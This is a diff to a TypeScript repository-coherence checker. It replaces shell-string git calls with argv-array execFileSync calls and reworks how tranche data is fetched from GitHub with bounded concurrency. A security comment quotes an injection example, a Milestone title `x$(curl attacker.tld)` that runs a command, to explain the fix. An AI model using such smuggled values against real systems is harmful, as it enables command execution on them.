@@ -27,20 +27,20 @@
  * the invoking process's own working directory.
  */
 
-import { execSync } from 'node:child_process'
+import { execFileSync } from 'node:child_process'
 import { existsSync, readFileSync } from 'node:fs'
 import { join } from 'node:path'
 import {
-  deriveTrancheFromForge,
   fetchProvenance,
   fetchTaskIssueRefs,
-  findMilestoneForSlug,
-  listActiveTrancheSlugs,
-  listArchivedTrancheSlugs,
-  listIssueMilestonesForSlug,
+  fetchTrancheIssuesAsync,
+  indexTrancheMilestonesAsync,
+  issueMilestonesFromIssues,
   resolveGithubToken,
-  resolveRepo
+  resolveRepo,
+  trancheFromIssues
 } from '@attalabs/aeg-forge-state'
+import type { GhIssue, TrancheMilestoneIndex } from '@attalabs/aeg-forge-state'
 import type { Tranche } from '@attalabs/aeg-types'
 import {
   checkA1,
@@ -154,21 +154,34 @@ export type PrReadContext = { prHeadSha: string; touchedFiles: Set<string> } | n
 function gitFetchMainQuiet(): void {
   try {
     // stdio: 'ignore' — this process's own stdout is the JSON report (in
-    // --json mode); nothing this shells out to may write to it. `execSync`
+    // --json mode); nothing this shells out to may write to it. `execFileSync`
     // without an explicit `stdio` already pipes the child's streams into
     // Node/Bun-internal buffers rather than the parent's real fds (verified:
     // this alone doesn't leak), but 'ignore' makes the "never touches our
     // stdout" invariant explicit rather than incidental.
-    execSync('git fetch origin main --quiet', { stdio: 'ignore' })
+    execFileSync('git', ['fetch', 'origin', 'main', '--quiet'], { stdio: 'ignore' })
   } catch {
     // best-effort — a fetch failure leaves origin/main at whatever the local
     // checkout already has; downstream reads simply fall back to that state.
   }
 }
 
+/**
+ * Both git readers below spawn `git` with an **argv array**, never a shell
+ * string (security pass, MEDIUM 2). `ref` and `relPath` are interpolated into
+ * the `<ref>:<path>` operand git itself parses, and one of those paths is
+ * assembled from a Milestone title — a value any account with write access to
+ * the repo can choose. Through a shell string, a title like
+ * `x$(curl attacker.tld)` executed; as one argv element it is a filename git
+ * fails to resolve, which both readers already treat as "absent". The `:`
+ * separator is git's own operand grammar, not shell syntax, so the argv form
+ * needs no quoting discipline to stay correct. `execFileSync` also spawns no
+ * intermediate shell process at all, so no `IFS`/`PATH` expansion sits between
+ * this file and `git`.
+ */
 function listDirAtRef(ref: string, relDir: string): string[] {
   try {
-    return execSync(`git ls-tree --name-only ${ref}:${relDir}`, { encoding: 'utf8' })
+    return execFileSync('git', ['ls-tree', '--name-only', `${ref}:${relDir}`], { encoding: 'utf8' })
       .split('\n')
       .map((s) => s.trim())
       .filter(Boolean)
@@ -179,67 +192,120 @@ function listDirAtRef(ref: string, relDir: string): string[] {
 
 function readFileAtRef(ref: string, relPath: string): string | null {
   try {
-    return execSync(`git show ${ref}:${relPath}`, { encoding: 'utf8' })
+    return execFileSync('git', ['show', `${ref}:${relPath}`], { encoding: 'utf8' })
   } catch {
     return null
   }
 }
 
 /**
- * Reads one non-PR-touched tranche file's content: `id`/`issue` come from
- * the forge (`@attalabs/aeg-forge-state`'s `deriveTrancheFromForge`, task
- * aeg-forge-state-v1 3b, #437) when a repo resolves and the forge call
- * succeeds — the golden comparison (Issue #437) confirmed these two fields
- * match the file-parsed topology table exactly for every task that HAS a
- * forge Issue. `dependsOn`/`conflictsWith` are read from the topology table
- * itself (`parseTranche`) and merged in, NOT forge-derived — a deliberate,
- * TEMPORARY narrowing of the original swap: a cohort of grandfathered Issues
- * predates the "Dependency rationale" grammar and carries no forge-parseable
- * dependency data at all, and
+ * Bounded-concurrency `map`. Every forge fan-out in this file goes through
+ * here rather than a bare `Promise.all`: an unbounded fan-out issues one
+ * simultaneous `gh` subprocess per tranche, which is precisely the burst
+ * shape GitHub's secondary rate limits penalise — turning a slow sweep into a
+ * throttled one. Each call is ~0.6-1.9 s of round trip and almost no CPU, so
+ * a small window already hides nearly all of the latency; going wider buys
+ * little and risks a lot.
+ */
+const FORGE_FETCH_CONCURRENCY = 4
+
+async function mapWithConcurrency<T, R>(
+  items: readonly T[],
+  limit: number,
+  fn: (item: T, index: number) => Promise<R>
+): Promise<R[]> {
+  const results = new Array<R>(items.length)
+  let next = 0
+  const worker = async (): Promise<void> => {
+    for (;;) {
+      const i = next++
+      if (i >= items.length) return
+      results[i] = await fn(items[i] as T, i)
+    }
+  }
+  await Promise.all(Array.from({ length: Math.max(1, Math.min(limit, items.length)) }, worker))
+  return results
+}
+
+/** One tranche file the sweep must resolve, enumerated before any forge data is fetched for it. */
+type TrancheCandidate = {
+  slug: string
+  archived: boolean
+  /** The identity of a candidate — two candidates can share a slug (an archival move). */
+  relPath: string
+  /** True when THIS PR's own diff touches this path, so its content comes from the PR head, never the forge. */
+  fromHead: boolean
+  /** The PR head's content for this path: `null` when not head-read, or when the PR deleted/renamed it. */
+  headContent: string | null
+}
+
+/**
+ * Everything one sweep read from the forge: the composed tranche list every
+ * check consumes, plus the raw per-slug Issue lists and the Milestone index
+ * it was built from.
+ *
+ * The raw halves are carried out deliberately. L4 (`listIssueMilestonesForSlug`)
+ * and L5 (`listActiveTrancheSlugs`) used to re-fetch exactly the data this
+ * sweep already holds — measured at 6.9 s and 0.6 s respectively of a 26 s
+ * run — because a `Tranche` drops both the Issues' `milestone` field and the
+ * Milestone list. Returning them lets those checks derive from the same
+ * bytes rather than issue a second identical query.
+ */
+export type TrancheSweep = {
+  files: TrancheFile[]
+  /** slug → the `vinaya/tranche:<slug>`-labeled Issues this run fetched; absent for any slug the sweep never needed forge data for. */
+  issuesBySlug: Map<string, GhIssue[]>
+  /** `null` only when no repo resolves, in which case nothing forge-dependent runs at all. */
+  milestones: TrancheMilestoneIndex | null
+  /**
+   * Tranches the forge could not be read for AND which no topology file could
+   * stand in for — so they are absent from `files` entirely.
+   *
+   * Surfaced rather than swallowed. A tranche missing from the sweep is one
+   * every repo-wide check trivially passes, so during a forge outage a
+   * silently-narrowed sweep reports green over the very tranches it failed to
+   * read. Observed live while re-verifying this change, with GitHub returning
+   * intermittent 503s: the run stayed `failed: 0` while its own tranche count
+   * fell run to run. `runCoherenceChecks` turns a non-empty list into a
+   * `severity:infra` FORGE failure — the same vocabulary the no-token and
+   * no-repo paths already use.
+   */
+  unavailableSlugs: string[]
+  /**
+   * The Milestone index — the sweep's enumeration authority — could not be
+   * read. Reported rather than thrown: `--json` mode's stdout must stay pure,
+   * parseable JSON (a CI job pipes it straight to `jq`), so an outage has to
+   * arrive as a FORGE failure in the report, not as a stack trace and an empty
+   * stdout.
+   */
+  milestoneIndexFailed: boolean
+}
+
+/**
+ * Merges the file-parsed topology table onto a forge-derived tranche.
+ *
+ * `id`/`issue` come from the forge — the golden comparison (Issue #437)
+ * confirmed these two fields match the file-parsed topology table exactly for
+ * every task that HAS a forge Issue. `dependsOn`/`conflictsWith` are read from
+ * the topology table itself (`parseTranche`) and merged in, NOT forge-derived
+ * — a deliberate, TEMPORARY narrowing of the original swap: a cohort of
+ * grandfathered Issues predates the "Dependency rationale" grammar and carries
+ * no forge-parseable dependency data at all, and
  * `parse-rationale-deps.ts`'s cross-tranche-qualified-ref handling has its
  * own real gaps independent of that (fixed one instance on Issue #388, but
  * others may remain). Backfilling/auditing the rest is its own follow-up
  * task, not a blocker for this cutover.
  *
  * A `#TBD` topology row (no Issue cut yet, `issue: null`) has no forge
- * representation at all — `deriveTrancheFromForge` can only ever list
- * tasks it finds via a labeled Issue, so a row with no Issue is structurally
- * invisible to it. T3 (`tbd-in-active-tranche`) exists specifically to
- * catch these — silently dropping them here would blind the one check whose
- * entire job is to see them (confirmed live: a tranche's real `#TBD` rows
- * vanish from the forge-derived list entirely).
- * So any file task with no forge counterpart is appended as-is, fully
- * file-derived, not merged.
- *
- * Falls back to the file entirely (dependsOn/conflictsWith included, #TBD
- * rows included) when forge derivation itself fails — mirrors this file's
- * own "never let one signal's unavailability crash the whole oracle"
- * discipline, already applied to every forge-dependent check below. This is
- * the ONLY place either fallback/merge applies — the PR-head-SHA path
- * (the plan-PR scoping, below) always reads the PR's own uncommitted
- * diff via `readFileAtRef` + `parseTranche`, never the forge, since a plan
- * PR's own in-progress topology edit has no forge equivalent to derive from.
+ * representation at all — forge derivation can only ever list tasks it finds
+ * via a labeled Issue, so a row with no Issue is structurally invisible to it.
+ * T3 (`tbd-in-active-tranche`) exists specifically to catch these — silently
+ * dropping them here would blind the one check whose entire job is to see them
+ * (confirmed live: a tranche's real `#TBD` rows vanish from the forge-derived
+ * list entirely). So any file task with no forge counterpart is appended
+ * as-is, fully file-derived, not merged.
  */
-async function deriveOrFallback(
-  repo: { owner: string; repo: string } | null,
-  slug: string,
-  relPath: string
-): Promise<Tranche | null> {
-  const raw = readFileAtRef('origin/main', relPath)
-  const fileTranche = raw === null ? null : parseTranche(raw)
-
-  if (!repo) return fileTranche
-
-  let forgeTranche: Tranche
-  try {
-    forgeTranche = await deriveTrancheFromForge(repo.owner, repo.repo, slug)
-  } catch (err) {
-    console.warn(
-      `[verify-coherence] forge derivation failed for tranche "${slug}" — falling back to file read: ${(err as Error).message}`
-    )
-    return fileTranche
-  }
-
+function mergeFileTopology(forgeTranche: Tranche, fileTranche: Tranche | null): Tranche {
   if (fileTranche === null) return forgeTranche
 
   const forgeTaskIds = new Set(forgeTranche.tasks.map((t) => t.id))
@@ -261,22 +327,65 @@ async function deriveOrFallback(
 }
 
 /**
- * `onlySlug`: skip every tranche but this one during the forge-derive
- * sweep below. The forge swap makes the general (unscoped) sweep meaningfully
- * slower than the old local-file read (one `gh` round trip per tranche per
- * lookup, sequential — ~1.5s/tranche observed across a real ~20-tranche
- * repo, vs near-instant `git show`), so a caller that only ever needs ONE
- * tranche's data (`--closes-n`, below) must opt out of paying for the rest.
- * `runCoherenceChecks` never passes this — its checks are genuinely
+ * `onlySlug`: resolve this one tranche and no other. The forge derivation is
+ * meaningfully more expensive than the old local-file read (a `gh` round trip
+ * per tranche vs a near-instant `git show`), so a caller that only ever needs
+ * ONE tranche's data (`--closes-n`, below) must opt out of paying for the
+ * rest. `runCoherenceChecks` never passes this — its checks are genuinely
  * repo-wide and need every tranche.
+ *
+ * Shape of the sweep, and why it is not a loop of self-contained derivations:
+ * every tranche is ENUMERATED first (topology files at `origin/main` and/or
+ * the PR head, then every Milestone with no file), and only then is forge data
+ * fetched — the Milestone index once for the whole run, each slug's labeled
+ * Issues exactly once, `FORGE_FETCH_CONCURRENCY` at a time. Deriving per slug
+ * through `deriveTrancheFromForge` instead re-pulled the entire Milestone list
+ * on every iteration and serialised every Issue query behind the last: 13.5 s
+ * of a 26 s run against a 6-Milestone repo, essentially all of it duplication.
+ * The derivation itself is unchanged — same Milestone facts, same Issue list,
+ * same merge — so the verdict this feeds is identical.
  */
-export async function loadTrancheFiles(prContext: PrReadContext = null, onlySlug?: string): Promise<TrancheFile[]> {
+export async function loadTrancheSweep(
+  prContext: PrReadContext = null,
+  onlySlug?: string,
+  baseRef = 'origin/main'
+): Promise<TrancheSweep> {
   gitFetchMainQuiet()
-  const files: TrancheFile[] = []
   const repo = await resolveRepo()
 
-  const loadDir = async (relDir: string, archived: boolean): Promise<void> => {
-    const mainNames = new Set(listDirAtRef('origin/main', relDir))
+  // The Milestone index is the sweep's enumeration authority, so its failure
+  // must not be fatal by default: the pre-refactor loader reached the forge
+  // per tranche inside its own per-tranche derivation helper, which caught and fell back to the
+  // topology file, so a transient `gh` failure degraded to a file read rather
+  // than killing the run — and the `--closes-n` merge gate depends on that.
+  // Degrading silently is only safe while something else can still enumerate
+  // tranches; if nothing does, see the guard after compose.
+  let milestones: TrancheMilestoneIndex | null = null
+  let milestoneIndexFailed = false
+  if (repo) {
+    try {
+      milestones = await indexTrancheMilestonesAsync(repo.owner, repo.repo)
+    } catch (err) {
+      milestoneIndexFailed = true
+      console.warn(
+        `[verify-coherence] Milestone index fetch failed — falling back to topology files: ${(err as Error).message}`
+      )
+    }
+  }
+
+  // ---------- enumerate ----------
+  // Candidates are keyed by PATH, never by slug. An archival PR (`git mv
+  // aeg-root/tranches/x.md aeg-root/tranches/completed/x.md`) legitimately
+  // produces TWO candidates for slug `x` — the old path, gone at the head, and
+  // the new one carrying the PR's own `Lifecycle: complete` edit. Suppressing
+  // the second because the first was already seen dropped the archived entry
+  // and kept a stale active one built from `baseRef`, inverting `archived` and
+  // reading around the PR head that `PrReadContext` exists to honour.
+  const candidates: TrancheCandidate[] = []
+  const seenPaths = new Set<string>()
+
+  const addFromDir = (relDir: string, archived: boolean): void => {
+    const mainNames = new Set(listDirAtRef(baseRef, relDir))
     const prNames = prContext ? new Set(listDirAtRef(prContext.prHeadSha, relDir)) : new Set<string>()
 
     for (const name of new Set([...mainNames, ...prNames])) {
@@ -284,70 +393,148 @@ export async function loadTrancheFiles(prContext: PrReadContext = null, onlySlug
       const slug = name.replace(/\.md$/, '')
       if (onlySlug && slug !== onlySlug) continue
       const relPath = `${relDir}/${name}`
-      const readFromHead = prContext?.touchedFiles.has(relPath) ?? false
-
-      if (readFromHead) {
-        const raw = readFileAtRef(prContext!.prHeadSha, relPath)
-        if (raw === null) continue
-        files.push({ slug, archived, tranche: parseTranche(raw) })
-        continue
-      }
-
-      const tranche = await deriveOrFallback(repo, slug, relPath)
-      if (tranche === null) continue
-      files.push({ slug, archived, tranche })
+      if (seenPaths.has(relPath)) continue
+      seenPaths.add(relPath)
+      const fromHead = prContext?.touchedFiles.has(relPath) ?? false
+      candidates.push({
+        slug,
+        archived,
+        relPath,
+        fromHead,
+        // Read eagerly: this is a local `git show`, no network, and knowing
+        // now whether the head carries content is what lets the forge fetch
+        // below be scoped to exactly the slugs that will actually need it.
+        headContent: fromHead ? readFileAtRef(prContext!.prHeadSha, relPath) : null
+      })
     }
   }
 
-  await loadDir(TRANCHES_RELDIR, false)
-  await loadDir(COMPLETED_RELDIR, true)
+  addFromDir(TRANCHES_RELDIR, false)
+  addFromDir(COMPLETED_RELDIR, true)
 
   // Forge-native tranches with no topology file at all (at the forge-native
   // cutover, a tranche's aeg-root/tranches/*.md was deleted once its
-  // Milestone-derived replacement was proven safe) are structurally
-  // invisible to the directory-listing
-  // enumeration above — there is no filename for a slug with zero file to
-  // ever appear in `mainNames`/`prNames`, so `deriveOrFallback` is never even
-  // called for it, even though `deriveOrFallback` itself already handles a
-  // missing file gracefully (readFileAtRef → null → pure-forge return, see
-  // its own doc comment). Only attempted when the caller wants exactly one
-  // slug (`onlySlug` — the closes-n gate's scoped-load path; the unscoped
-  // repo-wide sweep never sets it and is unaffected) and that slug wasn't
-  // already found via files. Gated on an explicit Milestone existence check
-  // so an unrecognized branch slug (typo, deleted tranche with no
-  // Milestone either) still reports "no topology found" rather than silently
-  // synthesizing a tranche.
-  if (onlySlug && repo && !files.some((f) => f.slug === onlySlug)) {
-    const milestone = findMilestoneForSlug(repo.owner, repo.repo, onlySlug)
-    if (milestone) {
-      const tranche = await deriveOrFallback(repo, onlySlug, `${TRANCHES_RELDIR}/${onlySlug}.md`)
-      if (tranche !== null) files.push({ slug: onlySlug, archived: false, tranche })
-    }
+  // Milestone-derived replacement was proven safe) are structurally invisible
+  // to the directory listing above — there is no filename for a slug with zero
+  // file to ever appear. The fill-in below covers them, and it is keyed on
+  // which slugs the candidates actually PRODUCE, not on which were enumerated:
+  // a candidate that vanished at the PR head produces nothing, and must still
+  // be recoverable from its Milestone.
+  const producedSlugs = new Set(candidates.filter((c) => !c.fromHead || c.headContent !== null).map((c) => c.slug))
+  const milestoneRefs: Array<{ slug: string; archived: boolean }> = milestones
+    ? onlySlug
+      ? // Scoped: gated on an explicit Milestone existence check so an
+        // unrecognized branch slug (typo, deleted tranche with no Milestone
+        // either) still reports "no topology found" rather than silently
+        // synthesizing a tranche.
+        milestones.facts.has(onlySlug)
+        ? [{ slug: onlySlug, archived: false }]
+        : []
+      : // Unscoped (#515): once no tranche carries a topology file at all, the
+        // directory listing finds nothing and every repo-wide check (A1-A3,
+        // T1-T3, D1, L1-L4) would silently see zero tranches.
+        [
+          ...milestones.active.map((r) => ({ slug: r.slug, archived: false })),
+          ...milestones.archived.map((r) => ({ slug: r.slug, archived: true }))
+        ]
+    : []
+
+  // ---------- fetch ----------
+  // Exactly the slugs that will consult the forge, bounded. Every other
+  // enumeration is already answered from local git.
+  const needForge = new Set<string>()
+  if (repo && milestones) {
+    // A candidate read from the PR head never consults the forge, in either
+    // direction: with content at the head that content IS the answer, and
+    // without it the candidate produces nothing at all — the compose pass
+    // skips it and the fill-in below is what recovers its slug, asking for its
+    // own fetch on the line after this one. Keying this on the candidate
+    // rather than on the slug is what keeps an archival move (two candidates,
+    // one slug, one of them self-sufficient) from paying for a query whose
+    // result is then discarded.
+    for (const c of candidates) if (!c.fromHead) needForge.add(c.slug)
+    for (const { slug } of milestoneRefs) if (!producedSlugs.has(slug)) needForge.add(slug)
   }
 
-  // Same forge-native gap, general (unscoped) sweep (#515):
-  // once no tranche carries a topology file at all, the directory-listing
-  // enumeration above finds nothing and every repo-wide check (A1-A3, T1-T3,
-  // D1, L1-L4) would silently see zero tranches. Fill in every Milestone
-  // (open or closed) the file sweep didn't already surface — same
-  // `deriveOrFallback` used everywhere else in this loader, so a Milestone
-  // whose slug DOES still have a legacy file gets its dependsOn/conflictsWith
-  // merged in exactly as before.
-  if (!onlySlug && repo) {
-    const activeRefs = listActiveTrancheSlugs(repo.owner, repo.repo)
-    const archivedRefs = listArchivedTrancheSlugs(repo.owner, repo.repo)
-    for (const { slug, archived } of [
-      ...activeRefs.map((r) => ({ slug: r.slug, archived: false })),
-      ...archivedRefs.map((r) => ({ slug: r.slug, archived: true }))
-    ]) {
-      if (files.some((f) => f.slug === slug)) continue
-      const relPath = `${archived ? COMPLETED_RELDIR : TRANCHES_RELDIR}/${slug}.md`
-      const tranche = await deriveOrFallback(repo, slug, relPath)
-      if (tranche !== null) files.push({ slug, archived, tranche })
+  const fetched = await mapWithConcurrency([...needForge], FORGE_FETCH_CONCURRENCY, async (slug) => {
+    try {
+      return { slug, issues: await fetchTrancheIssuesAsync(repo!.owner, repo!.repo, slug) }
+    } catch (err) {
+      // Never let one tranche's unavailability crash the whole oracle — the
+      // same discipline every forge-dependent check below already applies.
+      // The caller falls back to the topology file for this slug.
+      console.warn(
+        `[verify-coherence] forge derivation failed for tranche "${slug}" — falling back to file read: ${(err as Error).message}`
+      )
+      return { slug, issues: null }
     }
+  })
+
+  const issuesBySlug = new Map<string, GhIssue[]>()
+  const failedSlugs = new Set<string>()
+  for (const { slug, issues } of fetched) {
+    if (issues === null) failedSlugs.add(slug)
+    else issuesBySlug.set(slug, issues)
   }
 
-  return files
+  /** The shared file-plus-forge composition both compose passes below use. */
+  const composeFromFile = (slug: string, archived: boolean, relPath: string): TrancheFile | null => {
+    const raw = readFileAtRef(baseRef, relPath)
+    const fileTranche = raw === null ? null : parseTranche(raw)
+
+    // No repo, no Milestone index, or this slug's forge fetch failed — the
+    // topology file is the whole answer (dependsOn/conflictsWith included,
+    // #TBD rows included).
+    if (!repo || !milestones || failedSlugs.has(slug)) {
+      return fileTranche === null ? null : { slug, archived, tranche: fileTranche }
+    }
+
+    const forgeTranche = trancheFromIssues(slug, issuesBySlug.get(slug) ?? [], milestones.facts.get(slug))
+    return { slug, archived, tranche: mergeFileTopology(forgeTranche, fileTranche) }
+  }
+
+  // ---------- compose ----------
+  // One ordered pass over the candidates, so the emitted tranche order matches
+  // the pre-refactor loader's exactly (directory listing order, active dir then
+  // completed dir), then the Milestone fill-in.
+  const files: TrancheFile[] = []
+  for (const c of candidates) {
+    if (c.fromHead) {
+      // This PR's own topology diff: its content is the answer, and it has no
+      // forge equivalent to derive from.
+      if (c.headContent !== null) {
+        files.push({ slug: c.slug, archived: c.archived, tranche: parseTranche(c.headContent) })
+        continue
+      }
+      // Deleted or renamed at the head. Contributes nothing itself; a sibling
+      // candidate (the rename's destination) or the fill-in below recovers the
+      // slug, so a topology move cannot narrow the sweep.
+      continue
+    }
+    const composed = composeFromFile(c.slug, c.archived, c.relPath)
+    if (composed !== null) files.push(composed)
+  }
+
+  for (const { slug, archived } of milestoneRefs) {
+    if (files.some((f) => f.slug === slug)) continue
+    const relPath = `${archived ? COMPLETED_RELDIR : TRANCHES_RELDIR}/${slug}.md`
+    const composed = composeFromFile(slug, archived, relPath)
+    if (composed !== null) files.push(composed)
+  }
+
+  // A failed fetch falls back to the topology file; with no file to fall back
+  // to — the normal state post-cutover — the tranche is simply absent, and an
+  // absent tranche is one every check trivially passes. Record those so the
+  // caller reports the coverage gap instead of the sweep quietly shrinking.
+  const producedAfterCompose = new Set(files.map((f) => f.slug))
+  const unavailableSlugs = [...failedSlugs].filter((slug) => !producedAfterCompose.has(slug))
+
+  return { files, issuesBySlug, milestones, unavailableSlugs, milestoneIndexFailed }
+}
+
+/** `loadTrancheSweep`'s composed tranche list, for callers that need nothing else from the sweep. */
+export async function loadTrancheFiles(prContext: PrReadContext = null, onlySlug?: string): Promise<TrancheFile[]> {
+  return (await loadTrancheSweep(prContext, onlySlug)).files
 }
 
 // ---------- main orchestrator ------------------------------------------------
@@ -369,8 +556,25 @@ export async function runCoherenceChecks(
   options: RunCoherenceChecksOptions = {}
 ): Promise<{ results: CheckResult[]; forgeUnavailable: boolean }> {
   const { prContext = null, isPlanPr = false } = options
-  const files = await loadTrancheFiles(prContext)
+  const sweep = await loadTrancheSweep(prContext)
+  const { files } = sweep
   const results: CheckResult[] = []
+
+  // Enumeration failed AND nothing local could stand in: every repo-wide check
+  // would run against zero tranches and report clean, which is the exact silent
+  // blindness the Milestone fill-in exists to prevent. Refuse the run rather
+  // than return a green one — but refuse it as a report, so `--json` stdout
+  // stays parseable.
+  if (sweep.milestoneIndexFailed && files.length === 0) {
+    results.push({
+      check: 'FORGE',
+      status: 'fail',
+      failures: [],
+      note: 'severity:infra — the Milestone index could not be read and no topology file was found, so no tranche could be enumerated. No check in this run evaluated anything; re-run once the forge is reachable.'
+    })
+    results.push(...checkM1M2M3())
+    return { results, forgeUnavailable: true }
+  }
 
   // ---------- CI scope detection ----------
   // Parse the PR's tranche from BRANCH (CI) or GITHUB_HEAD_REF (Actions env).
@@ -554,21 +758,115 @@ export async function runCoherenceChecks(
   // `verify-dispatch.ts`'s Milestone-aware discovery uses — not `!f.archived`
   // (file location), so this never flags a tranche whose file predates
   // the Milestone birth rule but has no live Milestone yet.
-  const milestoneActiveSlugs = listActiveTrancheSlugs(owner, repoName).map((m) => m.slug)
-  const issueMilestones = milestoneActiveSlugs.flatMap((slug) =>
-    listIssueMilestonesForSlug(owner, repoName, slug).map((f) => ({ tranche: slug, ...f }))
-  )
-  results.push(checkL4(milestoneActiveSlugs, issueMilestones))
+  //
+  // Both halves read the sweep's own data rather than re-fetching it: the open
+  // Milestone list is the index it already pulled, and each slug's
+  // Milestone-attachment facts derive from the very Issue list its task
+  // derivation used (`gh issue list --json ... milestone` carries the
+  // attachment). Re-fetching cost 7.5 s of a 26 s run for bytes already in
+  // hand. Same authority, same facts — only the round trips are gone.
+  //
+  // The index is also the ONLY authority either check has: with it lost,
+  // `sweep.milestones` is null, the active list is empty, and both checks read
+  // that as "no active tranche has any drift" and report clean. That vacuous
+  // green is what the enumeration guard above refuses when the index failure
+  // leaves nothing at all to check — but that guard is gated on `files` being
+  // empty, so the moment one topology file survives to populate `files` the
+  // same outage passes silently here instead. Reachable in any repo that still
+  // carries `aeg-root/tranches/completed/*.md`, and on any plan PR that reads
+  // its own topology file from the head. It does not even take an outage:
+  // `indexTrancheMilestonesAsync` reads through `gh` while A1/A2/A3's snapshots
+  // read through octokit, so a `gh auth token` keyring failure alone produces
+  // an index-less run with `anyForgeUnavailable` still false. The pre-refactor
+  // path could not do this — L4/L5 called `listActiveTrancheSlugs`
+  // synchronously and uncaught, so an index failure killed the run rather than
+  // passing it. Neither check runs without its authority; the gap is reported.
+  if (sweep.milestoneIndexFailed) {
+    results.push({
+      check: 'FORGE',
+      status: 'fail',
+      failures: [],
+      note: 'severity:infra — the Milestone index could not be read, so L4 and L5 had no active-tranche authority and did not evaluate anything. Tranches resolved from topology files were still checked by everything above. Re-run once the forge is reachable.'
+    })
+  } else {
+    const milestoneActiveSlugs = (sweep.milestones?.active ?? []).map((m) => m.slug)
+    // The sweep fetches only the slugs its own composition needed, so a tranche
+    // resolved entirely from the PR head (or already present in `files` without
+    // consulting the forge) may have no entry here — top up just those, bounded.
+    //
+    // Deliberately NOT wrapped in a catch that substitutes an empty list: to L4
+    // an empty Issue list is indistinguishable from "this tranche has no
+    // attachment drift", so swallowing a transient forge failure here would
+    // report a clean advisory rather than an unavailable one. The pre-refactor
+    // path (`listIssueMilestonesForSlug`, a synchronous uncaught `gh` call)
+    // propagated and failed the run; that fail-closed behaviour is preserved.
+    const missingIssueSlugs = milestoneActiveSlugs.filter((slug) => !sweep.issuesBySlug.has(slug))
+    const toppedUp = await mapWithConcurrency(missingIssueSlugs, FORGE_FETCH_CONCURRENCY, async (slug) => {
+      try {
+        return { slug, issues: await fetchTrancheIssuesAsync(owner, repoName, slug) }
+      } catch {
+        return { slug, issues: null }
+      }
+    })
+    const l4UnavailableSlugs: string[] = []
+    for (const { slug, issues } of toppedUp) {
+      if (issues === null) l4UnavailableSlugs.push(slug)
+      else sweep.issuesBySlug.set(slug, issues)
+    }
 
-  // L5 — forge-native Milestone-state coherence (Issue #481, drift class #2):
-  // an open Milestone whose every task Issue is closed. Advisory analogue of
-  // file-based L1 for post-cutover tranches that have no topology file.
-  results.push(checkL5(milestoneActiveSlugs, entriesBySlug))
+    // A failed top-up is neither swallowed nor thrown. Substituting an empty list
+    // would make L4 read "no attachment drift" for a tranche it never saw;
+    // throwing would empty this process's stdout, which in `--json` mode must
+    // stay parseable JSON for the CI job that pipes it to `jq`. So the tranche is
+    // withheld from L4's inputs and the gap is reported below.
+    const l4Slugs = milestoneActiveSlugs.filter((slug) => !l4UnavailableSlugs.includes(slug))
+    const issueMilestones = l4Slugs.flatMap((slug) =>
+      issueMilestonesFromIssues(sweep.issuesBySlug.get(slug) ?? []).map((f) => ({ tranche: slug, ...f }))
+    )
+    results.push(checkL4(l4Slugs, issueMilestones))
+    if (l4UnavailableSlugs.length > 0) {
+      results.push({
+        check: 'FORGE',
+        status: 'fail',
+        failures: l4UnavailableSlugs.map((slug) => ({
+          tranche: slug,
+          reason:
+            "Forge read failed while collecting L4's Milestone-attachment facts — L4 did not evaluate this tranche."
+        })),
+        note: `severity:infra — ${l4UnavailableSlugs.length} tranche(s) were withheld from L4 because their Issue list could not be read. Re-run once the forge is reachable.`
+      })
+    }
+
+    // L5 — forge-native Milestone-state coherence (Issue #481, drift class #2):
+    // an open Milestone whose every task Issue is closed. Advisory analogue of
+    // file-based L1 for post-cutover tranches that have no topology file.
+    results.push(checkL5(milestoneActiveSlugs, entriesBySlug))
+  }
 
   // N/M stubs
   results.push(...checkM1M2M3())
 
-  return { results, forgeUnavailable: anyForgeUnavailable }
+  // Coverage gap, not a drift finding: these tranches were never read, so every
+  // check above passed them by default rather than on evidence. Reported at the
+  // same severity as a missing token — the run is not trustworthy, and saying
+  // so is the difference between an outage and a false green.
+  if (sweep.unavailableSlugs.length > 0) {
+    results.push({
+      check: 'FORGE',
+      status: 'fail',
+      failures: sweep.unavailableSlugs.map((slug) => ({
+        tranche: slug,
+        reason: 'Forge read failed and no topology file exists — this tranche was omitted from every check in this run.'
+      })),
+      note: `severity:infra — ${sweep.unavailableSlugs.length} tranche(s) could not be read from the forge and had no topology file to fall back to. Their checks did not run; re-run once the forge is reachable.`
+    })
+    return { results, forgeUnavailable: true }
+  }
+
+  // A lost Milestone index counts as forge-unavailable even when every other
+  // fetch succeeded: L4 and L5 did not evaluate, and the human-facing banner
+  // that says "forge-dependent checks may be incomplete" is exactly true.
+  return { results, forgeUnavailable: anyForgeUnavailable || sweep.milestoneIndexFailed }
 }
 
 // ---------- output ------------------------------------------------------------
